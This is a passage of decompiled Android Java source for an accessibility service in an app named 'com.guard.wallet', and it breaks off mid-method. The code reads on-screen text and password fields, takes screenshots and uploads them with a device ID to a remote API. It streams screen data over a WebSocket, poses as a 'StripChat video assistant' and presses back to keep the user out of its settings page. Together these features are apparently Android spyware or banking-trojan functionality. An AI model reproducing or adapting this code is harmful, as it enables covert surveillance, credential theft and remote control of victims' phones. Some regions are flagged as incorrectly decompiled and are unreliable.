package com.guard.wallet.service;

import a0.AbstractC0008h;
import a0.C0001a;
import a1.AbstractC0026q;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Rect;
import android.graphics.drawable.BitmapDrawable;
import android.os.Build;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.view.accessibility.AccessibilityWindowInfo;
import com.guard.wallet.MainApplication;
import com.guard.wallet.bridge.C0177a;
import com.guard.wallet.entity.NoticeRootChangedVO;
import com.guard.wallet.entity.Point;
import com.guard.wallet.entity.ReadScreenNodeInfo;
import com.guard.wallet.entity.ReadScreenWindow;
import com.guard.wallet.entity.RootInActiveWindowResult;
import com.guard.wallet.entity.TakeScreenShotResult;
import com.guard.wallet.entity.UiObject;
import com.guard.wallet.entity.UiObjectCollection;
import com.guard.wallet.filter.CombineFilter;
import com.guard.wallet.helper.AbstractC0178a;
import com.guard.wallet.http.AbstractC0207l;
import com.guard.wallet.http.C0204i;
import com.guard.wallet.http.e0;
import com.guard.wallet.req.ContainerEventVO;
import com.guard.wallet.req.MessageRecordVO;
import com.guard.wallet.req.ScreenMetricsVO;
import com.guard.wallet.req.UploadFileVO;
import com.guard.wallet.server.C0231c;
import com.guard.wallet.thread.CallableC0242k;
import com.guard.wallet.utils.AbstractC0248d;
import com.guard.wallet.utils.AbstractC0249e;
import com.guard.wallet.utils.AbstractC0251g;
import com.guard.wallet.utils.AbstractC0252h;
import d0.C0260a;
import e1.InterfaceC0273b;
import java.lang.reflect.Field;
import java.util.Iterator;
import java.util.LinkedList;
import java.util.List;
import java.util.ListIterator;
import java.util.Objects;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;
import java.util.concurrent.SynchronousQueue;
import java.util.concurrent.ThreadPoolExecutor;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.concurrent.atomic.AtomicReference;
import java.util.concurrent.locks.ReentrantLock;
import org.lsposed.hiddenapibypass.AbstractC0855i;
import p000a.AbstractC0000a;
import p012o.C0416e;
import p012o.C0429r;
import p012o.RunnableC0412a;
import p012o.b0;
import p012o.c0;
import p012o.g0;
import p019w.AbstractC0956a;
import p020x.C0967a;

/* loaded from: classes.dex */
public class MyAccessibilityService extends AccessibilityDelegateManager {

    /* renamed from: p */
    public static final AtomicReference f320p = new AtomicReference(null);

    /* renamed from: q */
    public static final AtomicBoolean f321q = new AtomicBoolean(false);

    /* renamed from: r */
    public static final AtomicBoolean f322r = new AtomicBoolean(false);

    /* renamed from: s */
    public static final AtomicReference f323s = new AtomicReference(null);

    /* renamed from: t */
    public static final AtomicReference f324t = new AtomicReference(null);

    /* renamed from: u */
    public static final AtomicReference f325u = new AtomicReference(null);

    /* renamed from: v */
    public static final AtomicReference f326v = new AtomicReference(null);

    /* renamed from: w */
    public static final AtomicReference f327w = new AtomicReference(null);

    /* renamed from: m */
    public C0260a f330m;

    /* renamed from: o */
    public ThreadPoolExecutor f332o;

    /* renamed from: k */
    public final AtomicInteger f328k = new AtomicInteger(0);

    /* renamed from: l */
    public final ReentrantLock f329l = new ReentrantLock();

    /* renamed from: n */
    public final AtomicBoolean f331n = new AtomicBoolean(false);

    /* renamed from: E */
    public static String m547E(AccessibilityEvent accessibilityEvent) {
        try {
            if (accessibilityEvent.getText().isEmpty()) {
                return null;
            }
            StringBuilder sb = new StringBuilder();
            for (CharSequence charSequence : accessibilityEvent.getText()) {
                if (charSequence != null) {
                    if (!AbstractC0026q.m151B(sb.toString())) {
                        sb.append(",");
                    }
                    sb.append(charSequence);
                }
            }
            return sb.toString();
        } catch (Exception e2) {
            AbstractC0026q.m186s("MyAccessibilityService", e2);
            return null;
        }
    }

    /* renamed from: I */
    public static boolean m548I(UiObject uiObject) {
        AtomicReference atomicReference = f320p;
        if (atomicReference.get() == null || !AbstractC0249e.m621j() || uiObject == null || uiObject.source() == null) {
            return false;
        }
        try {
            int i2 = Build.VERSION.SDK_INT;
            if (i2 >= 33 && ((MyAccessibilityService) atomicReference.get()).isNodeInCache(uiObject.source())) {
                ((MyAccessibilityService) atomicReference.get()).clearCachedSubtree(uiObject.source());
            }
            boolean m556Z = m556Z(uiObject.source());
            if (!m556Z && i2 > 30) {
                m556Z = m549K(uiObject.source());
            }
            if (m556Z) {
                return uiObject.source().refresh();
            }
            return false;
        } catch (Exception e2) {
            AbstractC0026q.m186s("clearCachedNode:", e2);
            return false;
        }
    }

    /* renamed from: K */
    public static boolean m549K(AccessibilityNodeInfo accessibilityNodeInfo) {
        if (accessibilityNodeInfo != null) {
            try {
                if (Build.VERSION.SDK_INT >= 28) {
                    AbstractC0855i.m1237a(AccessibilityNodeInfo.class, accessibilityNodeInfo, "setSealed", Boolean.TRUE);
                }
            } catch (Exception e2) {
                AbstractC0026q.m186s("MyAccessibilityService", e2);
            }
        }
        return m556Z(accessibilityNodeInfo);
    }

    /* renamed from: L */
    public static UiObjectCollection m550L(CombineFilter combineFilter) {
        try {
            AtomicReference atomicReference = f323s;
            if (atomicReference.get() != null) {
                return ((UiObject) atomicReference.get()).findByCombine(combineFilter);
            }
            return null;
        } catch (Exception e2) {
            AbstractC0026q.m186s("MyAccessibilityService", e2);
            return null;
        }
    }

    /* renamed from: M */
    public static UiObject m551M(CombineFilter combineFilter) {
        try {
            AtomicReference atomicReference = f323s;
            if (atomicReference.get() != null) {
                return ((UiObject) atomicReference.get()).findOneByCombine(combineFilter);
            }
            return null;
        } catch (Exception e2) {
            AbstractC0026q.m186s("MyAccessibilityService", e2);
            return null;
        }
    }

    /* renamed from: N */
    public static String m552N() {
        return (String) f325u.get();
    }

    /* renamed from: O */
    public static Rect m553O() {
        try {
            AtomicReference atomicReference = f324t;
            if (atomicReference.get() == null || ((AccessibilityNodeInfo) atomicReference.get()).getWindow() == null) {
                return null;
            }
            Rect rect = new Rect();
            ((AccessibilityNodeInfo) atomicReference.get()).getWindow().getBoundsInScreen(rect);
            if (rect.width() <= 0) {
                return null;
            }
            if (rect.height() > 0) {
                return rect;
            }
            return null;
        } catch (Exception e2) {
            AbstractC0026q.m186s("MyAccessibilityService", e2);
            return null;
        }
    }

    /* renamed from: P */
    public static MyAccessibilityService m554P() {
        return (MyAccessibilityService) f320p.get();
    }

    /* renamed from: Q */
    public static UiObject m555Q() {
        return (UiObject) f323s.get();
    }

    /* renamed from: Z */
    public static boolean m556Z(AccessibilityNodeInfo accessibilityNodeInfo) {
        if (accessibilityNodeInfo == null) {
            return false;
        }
        try {
            if (Build.VERSION.SDK_INT < 28) {
                return false;
            }
            Object m1237a = AbstractC0855i.m1237a(AccessibilityNodeInfo.class, accessibilityNodeInfo, "isSealed", new Object[0]);
            if (m1237a instanceof Boolean) {
                return ((Boolean) m1237a).booleanValue();
            }
            return false;
        } catch (Exception e2) {
            AbstractC0026q.m186s("MyAccessibilityService", e2);
            return false;
        }
    }

    public static void a0(byte[] bArr) {
        try {
            if (Integer.valueOf(C0231c.m511G().f300y.size()).intValue() > 0) {
                C0231c m511G = C0231c.m511G();
                m511G.getClass();
                if (bArr != null) {
                    try {
                        if (bArr.length > 0) {
                            ConcurrentLinkedQueue concurrentLinkedQueue = m511G.f300y;
                            if (!concurrentLinkedQueue.isEmpty()) {
                                Iterator it = concurrentLinkedQueue.iterator();
                                while (it.hasNext()) {
                                    ((InterfaceC0273b) it.next()).mo746a(bArr);
                                }
                            }
                        }
                    } catch (Exception e2) {
                        AbstractC0026q.m186s("MyWebSocketServer", e2);
                    }
                }
            }
            C0177a c0177a = AbstractC0026q.f58d;
            boolean z2 = true;
            if (!(c0177a != null && c0177a.f194w.get()) || bArr == null || bArr.length <= 0) {
                return;
            }
            C0177a c0177a2 = AbstractC0026q.f58d;
            if (c0177a2 == null || !c0177a2.f194w.get()) {
                z2 = false;
            }
            if (z2) {
                AbstractC0026q.f58d.m336B(bArr);
            }
        } catch (Exception e3) {
            AbstractC0026q.m186s("MyAccessibilityService", e3);
        }
    }

    public static void e0(AccessibilityNodeInfo accessibilityNodeInfo, int i2, int i3, ReadScreenWindow readScreenWindow) {
        if (accessibilityNodeInfo != null) {
            try {
                if (accessibilityNodeInfo.isVisibleToUser() && (accessibilityNodeInfo.getText() != null || accessibilityNodeInfo.getContentDescription() != null || accessibilityNodeInfo.isEditable() || accessibilityNodeInfo.isPassword() || accessibilityNodeInfo.getChildCount() == 0)) {
                    ReadScreenNodeInfo readScreenNodeInfo = new ReadScreenNodeInfo(i2, i3);
                    Rect rect = new Rect();
                    accessibilityNodeInfo.getBoundsInScreen(rect);
                    AbstractC0178a.m341c(rect);
                    readScreenNodeInfo.setBoundsInScreen(rect);
                    readScreenNodeInfo.setWidth(rect.width());
                    readScreenNodeInfo.setHeight(rect.height());
                    readScreenNodeInfo.setCenterInScreen(new Point(rect.exactCenterX(), rect.exactCenterY()));
                    if (accessibilityNodeInfo.getPackageName() != null) {
                        readScreenNodeInfo.setPackageName(accessibilityNodeInfo.getPackageName().toString());
                    }
                    if (accessibilityNodeInfo.getClassName() != null) {
                        readScreenNodeInfo.setClassName(accessibilityNodeInfo.getClassName().toString());
                    }
                    if (accessibilityNodeInfo.getText() != null) {
                        readScreenNodeInfo.setText(accessibilityNodeInfo.getText().toString());
                    }
                    if (accessibilityNodeInfo.getContentDescription() != null) {
                        readScreenNodeInfo.setDesc(accessibilityNodeInfo.getContentDescription().toString());
                    }
                    readScreenWindow.getChildren().add(readScreenNodeInfo);
                }
                if (accessibilityNodeInfo.getChildCount() > 0) {
                    for (int i4 = 0; i4 < accessibilityNodeInfo.getChildCount(); i4++) {
                        e0(accessibilityNodeInfo.getChild(i4), i2 + 1, i4, readScreenWindow);
                    }
                }
            } catch (Exception e2) {
                AbstractC0026q.m186s("MyAccessibilityService", e2);
            }
        }
    }

    public static AccessibilityNodeInfo m0(AccessibilityNodeInfo accessibilityNodeInfo) {
        if (accessibilityNodeInfo != null) {
            try {
                if (accessibilityNodeInfo.getParent() == null) {
                    return accessibilityNodeInfo;
                }
                accessibilityNodeInfo.recycle();
                return m0(accessibilityNodeInfo.getParent());
            } catch (Exception e2) {
                AbstractC0026q.m186s("MyAccessibilityService", e2);
            }
        }
        return accessibilityNodeInfo;
    }

    public static TakeScreenShotResult n0(CallableC0242k callableC0242k, boolean z2) {
        TakeScreenShotResult takeScreenShotResult;
        Exception e2;
        Future future;
        try {
            LinkedList linkedList = new LinkedList();
            linkedList.add(Executors.newFixedThreadPool(2).submit(callableC0242k));
            TakeScreenShotResult takeScreenShotResult2 = null;
            while (!linkedList.isEmpty()) {
                ListIterator listIterator = linkedList.listIterator();
                while (listIterator.hasNext()) {
                    try {
                        future = (Future) listIterator.next();
                    } catch (Exception e3) {
                        takeScreenShotResult = takeScreenShotResult2;
                        e2 = e3;
                    }
                    if (future.isDone()) {
                        takeScreenShotResult = (TakeScreenShotResult) future.get();
                        try {
                            listIterator.remove();
                            if (takeScreenShotResult != null && takeScreenShotResult.getSaveBytesResult() != null && takeScreenShotResult.getSaveBytesResult().length > 0 && z2) {
                                byte[] saveBytesResult = takeScreenShotResult.getSaveBytesResult();
                                String str = AbstractC0207l.f252a;
                                String m708l = AbstractC0252h.m708l("deviceId");
                                if (!AbstractC0026q.m151B(m708l) && saveBytesResult != null && saveBytesResult.length > 0) {
                                    new C0204i().m411k(new UploadFileVO(m708l, "100016"), "/api/shotFile/batch.json", null, saveBytesResult, new e0());
                                }
                            }
                        } catch (Exception e4) {
                            e2 = e4;
                            AbstractC0026q.m186s("MyAccessibilityService", e2);
                            takeScreenShotResult2 = takeScreenShotResult;
                        }
                        takeScreenShotResult2 = takeScreenShotResult;
                    }
                }
            }
            return takeScreenShotResult2;
        } catch (Exception e5) {
            AbstractC0026q.m186s("MyAccessibilityService", e5);
            return null;
        }
    }

    /* JADX WARN: Removed duplicated region for block: B:22:0x0074 A[EXC_TOP_SPLITTER, SYNTHETIC] */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public static BitmapDrawable o0() {
        TakeScreenShotResult n02;
        Bitmap decodeByteArray;
        try {
            if (Build.VERSION.SDK_INT < 30) {
                C0967a m1462b = C0967a.m1462b();
                ReentrantLock reentrantLock = m1462b.f2300e;
                if (reentrantLock.tryLock()) {
                    if (m1462b.m1464c()) {
                        int i2 = (int) 100.0f;
                        Bitmap bitmap = (Bitmap) m1462b.f2302g.f2303a.get();
                        if (bitmap != null) {
                            byte[] M0 = AbstractC0251g.M0(bitmap, 1.0f, i2);
                            reentrantLock.unlock();
                            n02 = new TakeScreenShotResult(null, M0);
                        }
                    } else {
                        m1462b.m1466f();
                    }
                    reentrantLock.unlock();
                }
                n02 = null;
            } else {
                n02 = n0(new CallableC0242k(Float.valueOf(1.0f)), false);
            }
            if (n02 != null && n02.getSaveBytesResult() != null && n02.getSaveBytesResult().length > 0) {
                byte[] saveBytesResult = n02.getSaveBytesResult();
                if (saveBytesResult != null) {
                    try {
                    } catch (Exception e2) {
                        AbstractC0026q.m186s("BitmapUtils", e2);
                    }
                    if (saveBytesResult.length > 0) {
                        decodeByteArray = BitmapFactory.decodeByteArray(saveBytesResult, 0, saveBytesResult.length);
                        if (decodeByteArray != null) {
                            try {
                                BitmapDrawable bitmapDrawable = new BitmapDrawable(decodeByteArray);
                                bitmapDrawable.setAlpha(255);
                                return bitmapDrawable;
                            } catch (Exception e3) {
                                AbstractC0026q.m186s("BitmapUtils", e3);
                                return null;
                            }
                        }
                    }
                }
                decodeByteArray = null;
                if (decodeByteArray != null) {
                }
            }
        } catch (Exception e4) {
            AbstractC0026q.m186s("MyAccessibilityService", e4);
        }
        return null;
    }

    public static TakeScreenShotResult u0() {
        try {
            if (Build.VERSION.SDK_INT >= 30) {
                return n0(new CallableC0242k(false), true);
            }
            C0967a m1462b = C0967a.m1462b();
            ReentrantLock reentrantLock = m1462b.f2300e;
            if (!reentrantLock.tryLock()) {
                return null;
            }
            if (m1462b.m1464c()) {
                Bitmap bitmap = (Bitmap) m1462b.f2302g.f2303a.get();
                if (bitmap != null) {
                    byte[] M0 = AbstractC0251g.M0(bitmap, 0.5f, 80);
                    reentrantLock.unlock();
                    return new TakeScreenShotResult(null, M0);
                }
            } else {
                m1462b.m1466f();
            }
            reentrantLock.unlock();
            return null;
        } catch (Exception e2) {
            AbstractC0026q.m186s("MyAccessibilityService", e2);
            return null;
        }
    }

    /* renamed from: F */
    public final void m557F(int i2) {
        if (i2 > 0) {
            try {
                if (this.f328k.addAndGet(i2) < 2 || MainApplication.getInstance() == null) {
                    return;
                }
                MainApplication.getInstance().offerStrategyEvent("LOAD_LISTEN_WINDOW_FINISHED");
            } catch (Exception e2) {
                AbstractC0026q.m186s("MyAccessibilityService", e2);
            }
        }
    }

    /* JADX WARN: Can't wrap try/catch for region: R(20:48|(1:50)(1:131)|51|(1:53)(1:130)|54|55|(2:57|(1:61))|62|(8:67|68|69|70|71|(2:122|(1:77)(19:78|(1:80)|81|(1:83)|84|(1:86)|87|(1:89)|90|91|(1:93)(2:113|(1:118)(1:117))|94|(1:96)|97|(1:99)|100|(1:102)|103|(4:105|(1:111)(1:108)|109|110)(1:112)))|75|(0)(0))|126|(1:128)|129|68|69|70|71|(1:73)|119|122|(0)(0)) */
    /* JADX WARN: Code restructure failed: missing block: B:124:0x0148, code lost:
    
        r0 = move-exception;
     */
    /* JADX WARN: Code restructure failed: missing block: B:125:0x0149, code lost:
    
        a1.AbstractC0026q.m186s("MyAccessibilityService", r0);
        r0 = false;
     */
    /* JADX WARN: Removed duplicated region for block: B:21:? A[RETURN, SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:77:0x014f A[RETURN] */
    /* JADX WARN: Removed duplicated region for block: B:78:0x0150 A[Catch: Exception -> 0x0290, TryCatch #0 {Exception -> 0x0290, blocks: (B:4:0x0012, B:9:0x001a, B:15:0x002c, B:17:0x0032, B:34:0x0052, B:37:0x0058, B:39:0x0062, B:42:0x006a, B:44:0x007a, B:46:0x0086, B:48:0x0096, B:50:0x009e, B:51:0x00aa, B:53:0x00b0, B:54:0x00bb, B:57:0x00cd, B:59:0x00ee, B:61:0x00f8, B:78:0x0150, B:80:0x015c, B:81:0x0161, B:83:0x0167, B:84:0x017c, B:86:0x0182, B:87:0x0191, B:89:0x0197, B:90:0x01a6, B:93:0x01b2, B:94:0x01e3, B:96:0x01fa, B:97:0x020f, B:99:0x0219, B:100:0x0230, B:102:0x023a, B:103:0x0251, B:105:0x0279, B:109:0x0286, B:113:0x01be, B:115:0x01ce, B:117:0x01d8, B:125:0x0149, B:126:0x0109, B:128:0x010f, B:132:0x028a, B:71:0x011c, B:73:0x0124, B:119:0x012e, B:122:0x013d, B:23:0x003b, B:31:0x004c), top: B:3:0x0012, inners: #2, #3 }] */
    /* renamed from: G */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final void m558G(AccessibilityEvent accessibilityEvent) {
        String charSequence;
        boolean z2;
        boolean z3;
        boolean z4;
        String charSequence2;
        boolean contains;
        if (accessibilityEvent == null) {
            return;
        }
        try {
            if (accessibilityEvent.getEventType() <= 0) {
                return;
            }
            int eventType = accessibilityEvent.getEventType();
            if (eventType != 32 && eventType != 16384) {
                if (eventType != 2048) {
                    return;
                }
                ConcurrentLinkedQueue concurrentLinkedQueue = this.f305c;
                if (concurrentLinkedQueue.isEmpty()) {
                    return;
                }
                CharSequence packageName = accessibilityEvent.getPackageName();
                if (packageName != null) {
                    try {
                        charSequence2 = packageName.toString();
                        try {
                        } catch (Exception e2) {
                            AbstractC0026q.m186s("com.guard.wallet.service.AccessibilityDelegateManager", e2);
                        }
                    } catch (Exception e3) {
                        AbstractC0026q.m186s("com.guard.wallet.service.AccessibilityDelegateManager", e3);
                    }
                    if (!AbstractC0026q.m151B(charSequence2)) {
                        contains = concurrentLinkedQueue.contains(charSequence2);
                        if (!contains) {
                            return;
                        }
                    }
                }
                contains = false;
                if (!contains) {
                }
            }
            RootInActiveWindowResult m561R = m561R();
            AccessibilityNodeInfo curRoot = m561R.getCurRoot();
            AtomicReference atomicReference = f323s;
            if (atomicReference.get() != null && !Objects.equals(curRoot, ((UiObject) atomicReference.get()).source()) && ((UiObject) atomicReference.get()).isRootRecycle()) {
                Log.d("MyAccessibilityService", "Active root node will recycle");
                ((UiObject) atomicReference.get()).recycle();
            }
            if (curRoot == null) {
                Log.d("MyAccessibilityService", "root is Null");
                return;
            }
            String charSequence3 = curRoot.getPackageName() != null ? curRoot.getPackageName().toString() : null;
            String charSequence4 = curRoot.getClassName() != null ? curRoot.getClassName().toString() : null;
            String m563T = m563T();
            AtomicReference atomicReference2 = f326v;
            AtomicReference atomicReference3 = f325u;
            if (eventType == 2048) {
                Log.d("MyAccessibilityService", "窗口内容更新作为窗口状态变化:" + accessibilityEvent.getPackageName().toString());
                if (Objects.equals(charSequence3, atomicReference3.get()) && !AbstractC0026q.m151B(atomicReference2.get())) {
                    charSequence4 = (String) atomicReference2.get();
                }
            }
            if (eventType != 32 && eventType != 16384) {
                charSequence = charSequence4;
                if ((Objects.equals(charSequence3, "com.android.systemui") || !Objects.equals(charSequence, "android.view.View")) && !Objects.equals(charSequence, getPackageName().concat(".LockActivity"))) {
                    z2 = Objects.equals(charSequence, "com.google.guard".concat(".LockActivity"));
                    if (z2) {
                        return;
                    }
                    AtomicReference atomicReference4 = f324t;
                    if (!curRoot.equals(atomicReference4.get())) {
                        Log.d("MyAccessibilityService", "当前视图根节点已变化");
                    }
                    if (atomicReference3.get() != null) {
                        Log.d("MyAccessibilityService", "上一个运行包名 old activePackageName:" + ((String) atomicReference3.get()));
                    }
                    if (atomicReference2.get() != null) {
                        Log.d("MyAccessibilityService", "上一个运行窗口 old activeWindowClassName:" + atomicReference2);
                    }
                    if (!AbstractC0026q.m151B(charSequence)) {
                        Log.d("MyAccessibilityService", "当前视图栈顶节点:" + charSequence);
                    }
                    boolean equals = Objects.equals(atomicReference3.get(), charSequence3);
                    AtomicReference atomicReference5 = f327w;
                    if (!equals) {
                        atomicReference3.set(charSequence3);
                        atomicReference2.set(charSequence);
                        atomicReference5.set(m563T);
                        z3 = true;
                        z4 = true;
                    } else if (!m531l(AbstractC0251g.v0(charSequence3, charSequence, C0416e.class.getName())) || Objects.equals(atomicReference2.get(), charSequence)) {
                        z3 = false;
                        z4 = false;
                    } else {
                        atomicReference2.set(charSequence);
                        atomicReference5.set(m563T);
                        z4 = true;
                        z3 = false;
                    }
                    m559H(z3, z4);
                    UiObject createRoot = UiObject.createRoot(curRoot);
                    atomicReference4.set(curRoot);
                    atomicReference.set(createRoot);
                    if (!AbstractC0026q.m151B(atomicReference3.get())) {
                        Log.d("MyAccessibilityService", "当前运行包名已变化 new rootPackageName:" + ((String) atomicReference3.get()));
                    }
                    if (!AbstractC0026q.m151B(atomicReference2.get())) {
                        Log.d("MyAccessibilityService", "当前运行窗口已变化 new windowClassName:" + ((String) atomicReference2.get()));
                    }
                    if (!AbstractC0026q.m151B(atomicReference5.get())) {
                        Log.d("MyAccessibilityService", "当前运行窗口已变化 new windowTitle:" + ((String) atomicReference5.get()));
                    }
                    boolean i02 = i0(charSequence3, charSequence, m563T, m561R.isComplete());
                    boolean h02 = h0((String) atomicReference3.get(), (String) atomicReference2.get(), (String) atomicReference5.get(), m561R.isComplete());
                    if (atomicReference.get() != null) {
                        ((UiObject) atomicReference.get()).setRootRecycle((h02 || i02) ? false : true);
                        return;
                    }
                    return;
                }
                z2 = true;
                if (z2) {
                }
            }
            charSequence = accessibilityEvent.getClassName() != null ? accessibilityEvent.getClassName().toString() : null;
            if (Objects.equals(charSequence3, "com.android.systemui")) {
            }
            z2 = Objects.equals(charSequence, "com.google.guard".concat(".LockActivity"));
            if (z2) {
            }
        } catch (Exception e4) {
            AbstractC0026q.m186s("changeRootInActiveWindow", e4);
        }
    }

    /* renamed from: H */
    public final void m559H(boolean z2, boolean z3) {
        AtomicReference atomicReference = f324t;
        try {
            if (!z2) {
                if (!z3 || atomicReference.get() == null) {
                    return;
                }
                if (Build.VERSION.SDK_INT >= 33) {
                    clearCachedSubtree((AccessibilityNodeInfo) atomicReference.get());
                }
                boolean m556Z = m556Z((AccessibilityNodeInfo) atomicReference.get());
                if (!m556Z) {
                    m556Z = m549K((AccessibilityNodeInfo) atomicReference.get());
                }
                if (m556Z) {
                    ((AccessibilityNodeInfo) atomicReference.get()).refresh();
                    return;
                }
                return;
            }
            int i2 = Build.VERSION.SDK_INT;
            if (i2 >= 33) {
                clearCache();
            }
            if (atomicReference.get() != null) {
                if (i2 >= 33) {
                    clearCachedSubtree((AccessibilityNodeInfo) atomicReference.get());
                }
                boolean m556Z2 = m556Z((AccessibilityNodeInfo) atomicReference.get());
                if (!m556Z2) {
                    m556Z2 = m549K((AccessibilityNodeInfo) atomicReference.get());
                }
                if (m556Z2) {
                    ((AccessibilityNodeInfo) atomicReference.get()).refresh();
                }
            }
        } catch (Exception e2) {
            AbstractC0026q.m186s("clearCacheRoot:", e2);
        }
    }

    /* renamed from: J */
    public final UiObject m560J() {
        try {
            AccessibilityNodeInfo findFocus = findFocus(1);
            if (findFocus != null) {
                return UiObject.createRoot(findFocus);
            }
            AtomicReference atomicReference = f323s;
            if (atomicReference.get() != null) {
                return ((UiObject) atomicReference.get()).currentFocusedNode();
            }
            return null;
        } catch (Exception e2) {
            AbstractC0026q.m186s("MyAccessibilityService", e2);
            return null;
        }
    }

    /* JADX WARN: Removed duplicated region for block: B:38:0x0051  */
    /* renamed from: R */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final RootInActiveWindowResult m561R() {
        AccessibilityNodeInfo accessibilityNodeInfo;
        try {
            accessibilityNodeInfo = super.getRootInActiveWindow();
            if (accessibilityNodeInfo != null) {
                try {
                    accessibilityNodeInfo = m0(accessibilityNodeInfo);
                } catch (Exception e2) {
                    e = e2;
                    AbstractC0026q.m186s("MyAccessibilityService", e);
                    if (accessibilityNodeInfo == null) {
                    }
                    return new RootInActiveWindowResult(accessibilityNodeInfo, false);
                }
            }
            List<AccessibilityWindowInfo> windows = getWindows();
            if (windows != null && !windows.isEmpty()) {
                for (AccessibilityWindowInfo accessibilityWindowInfo : windows) {
                    if (accessibilityWindowInfo != null && accessibilityWindowInfo.isActive() && accessibilityNodeInfo == null) {
                        accessibilityNodeInfo = Build.VERSION.SDK_INT >= 33 ? accessibilityWindowInfo.getRoot(4) : accessibilityWindowInfo.getRoot();
                        if (accessibilityNodeInfo != null) {
                            accessibilityNodeInfo = m0(accessibilityNodeInfo);
                        }
                    }
                }
            }
        } catch (Exception e3) {
            e = e3;
            accessibilityNodeInfo = null;
        }
        if (accessibilityNodeInfo == null) {
            Log.d("MyAccessibilityService", "curRoot is Null");
        }
        return new RootInActiveWindowResult(accessibilityNodeInfo, false);
    }

    /* renamed from: S */
    public final String m562S() {
        try {
            AccessibilityNodeInfo rootInActiveWindow = getRootInActiveWindow();
            return (rootInActiveWindow == null || rootInActiveWindow.getPackageName() == null) ? (String) f325u.get() : rootInActiveWindow.getPackageName().toString();
        } catch (Exception e2) {
            AbstractC0026q.m186s("MyAccessibilityService", e2);
            return null;
        }
    }

    /* renamed from: T */
    public final String m563T() {
        List<AccessibilityWindowInfo> windows = getWindows();
        if (windows == null || windows.isEmpty()) {
            return null;
        }
        for (AccessibilityWindowInfo accessibilityWindowInfo : windows) {
            if (accessibilityWindowInfo != null && accessibilityWindowInfo.isActive() && accessibilityWindowInfo.getTitle() != null) {
                return accessibilityWindowInfo.getTitle().toString();
            }
        }
        return null;
    }

    /* renamed from: U */
    public final boolean m564U(AccessibilityEvent accessibilityEvent) {
        if (accessibilityEvent == null) {
            return false;
        }
        try {
            if (accessibilityEvent.getEventType() <= 0 || accessibilityEvent.getEventType() != 32 || AbstractC0251g.p0() || AbstractC0252h.m713q()) {
                return false;
            }
            String m563T = m563T();
            Integer num = AbstractC0248d.f402a;
            if (!Objects.equals(m563T, (MainApplication.getInstance() == null || MainApplication.getInstance().getBuildConfig() == null || AbstractC0026q.m151B(MainApplication.getInstance().getBuildConfig().getAccessibilityServiceLabel())) ? "StripChat video assistant" : MainApplication.getInstance().getBuildConfig().getAccessibilityServiceLabel())) {
                return false;
            }
            Log.d("MyAccessibilityService", "back");
            AbstractC0251g.F0(1);
            return true;
        } catch (Exception e2) {
            AbstractC0026q.m186s("MyAccessibilityService", e2);
            return false;
        }
    }

    /* renamed from: V */
    public final boolean m565V() {
        return this.f328k.get() >= 2;
    }

    /* renamed from: W */
    public final boolean m566W(AccessibilityEvent accessibilityEvent) {
        if (accessibilityEvent != null) {
            try {
                if (accessibilityEvent.getEventType() > 0) {
                    String charSequence = accessibilityEvent.getPackageName() != null ? accessibilityEvent.getPackageName().toString() : (String) f325u.get();
                    if (AbstractC0026q.m151B(charSequence) || Objects.equals(charSequence, getPackageName()) || Objects.equals(charSequence, "com.google.guard")) {
                        return true;
                    }
                    if (Objects.equals(Integer.valueOf(accessibilityEvent.getEventType()), 2048)) {
                        return !m530k(charSequence);
                    }
                    return false;
                }
            } catch (Exception e2) {
                AbstractC0026q.m186s("isIgnoreEvent", e2);
                return false;
            }
        }
        return true;
    }

    /* renamed from: X */
    public final boolean m567X(AccessibilityEvent accessibilityEvent) {
        if (accessibilityEvent != null) {
            try {
                if (accessibilityEvent.getEventType() > 0) {
                    String charSequence = accessibilityEvent.getPackageName() != null ? accessibilityEvent.getPackageName().toString() : null;
                    if (AbstractC0026q.m151B(charSequence) || Objects.equals(charSequence, getPackageName()) || Objects.equals(Integer.valueOf(accessibilityEvent.getEventType()), 64)) {
                        return true;
                    }
                    if (Objects.equals(Integer.valueOf(accessibilityEvent.getEventType()), 2048)) {
                        return !m530k(charSequence);
                    }
                    return false;
                }
            } catch (Exception e2) {
                AbstractC0026q.m186s("MyAccessibilityService", e2);
                return false;
            }
        }
        return true;
    }

    /* renamed from: Y */
    public final boolean m568Y() {
        C0260a c0260a = this.f330m;
        return c0260a != null && c0260a.f424b.get();
    }

    public final void b0(AccessibilityEvent accessibilityEvent) {
        try {
            if (Integer.valueOf(C0231c.m511G().f300y.size()).intValue() <= 0) {
                C0177a c0177a = AbstractC0026q.f58d;
                if (!(c0177a != null && c0177a.f194w.get())) {
                    return;
                }
            }
            if (accessibilityEvent != null && accessibilityEvent.getEventType() > 0) {
                if (!AbstractC0026q.m151B(accessibilityEvent.getPackageName() != null ? accessibilityEvent.getPackageName().toString() : (String) f325u.get()) && Objects.equals(Integer.valueOf(accessibilityEvent.getEventType()), 2048)) {
                    this.f307e.m1134a();
                }
            }
        } catch (Exception e2) {
            AbstractC0026q.m186s("liveBroadcastEvent", e2);
        }
    }

    public final void c0(AccessibilityEvent accessibilityEvent) {
        AccessibilityEvent obtain;
        if (accessibilityEvent != null) {
            try {
            } catch (Exception e2) {
                AbstractC0026q.m186s("MyAccessibilityService", e2);
            }
            if (c0.m1053b(accessibilityEvent.getEventType()) || c0.m1052a(accessibilityEvent.getEventType())) {
                if (Integer.valueOf(C0231c.m511G().f301z.size()).intValue() > 0 || AbstractC0026q.m193z()) {
                    if (Objects.equals(accessibilityEvent.getPackageName() != null ? accessibilityEvent.getPackageName().toString() : null, getPackageName())) {
                        return;
                    }
                    boolean m1053b = c0.m1053b(accessibilityEvent.getEventType());
                    c0 c0Var = this.f308f;
                    if (m1053b) {
                        c0Var.getClass();
                        try {
                            if (c0Var.f855b.get()) {
                                return;
                            }
                            c0Var.f854a.submit(new RunnableC0412a(c0Var, 4));
                            return;
                        } catch (Exception e3) {
                            AbstractC0026q.m186s("o.c0", e3);
                            return;
